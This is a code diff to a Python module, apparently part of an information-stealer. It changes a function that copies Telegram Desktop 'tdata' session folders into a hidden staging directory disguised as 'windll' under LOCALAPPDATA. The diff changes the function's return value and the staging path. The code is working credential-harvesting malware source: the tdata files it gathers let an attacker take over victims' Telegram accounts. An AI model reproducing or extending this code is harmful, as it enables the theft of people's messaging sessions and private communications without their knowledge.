@@ -13,9 +13,10 @@ import os
 from shutil import copytree,ignore_patterns
 from manager.logger import Log
 
-def Telegram(data):
+def Telegram():
+    msgInfo = ""
     roaming = os.getenv('APPDATA')
-    pathToLogs = f"{os.getenv('LOCALAPPDATA')}\\windll\\Telegram"
+    pathToLogs = f"{os.getenv('LOCALAPPDATA')}\\windll\\Messengers\\Telegram"
     dirs=[
         roaming+"\\Telegram Desktop\\tdata",
         'D:\\Telegram Desktop\\tdata',
@@ -26,5 +27,5 @@ def Telegram(data):
             copytree(dir,pathToLogs,ignore = ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
     except Exception as e:
         Log(f"Telegram {dir} ---> {e}")
-    data.append("\n∟📨Telegram")
-    return data
+    msgInfo+="\n∟📨Telegram"
+    return msgInfo
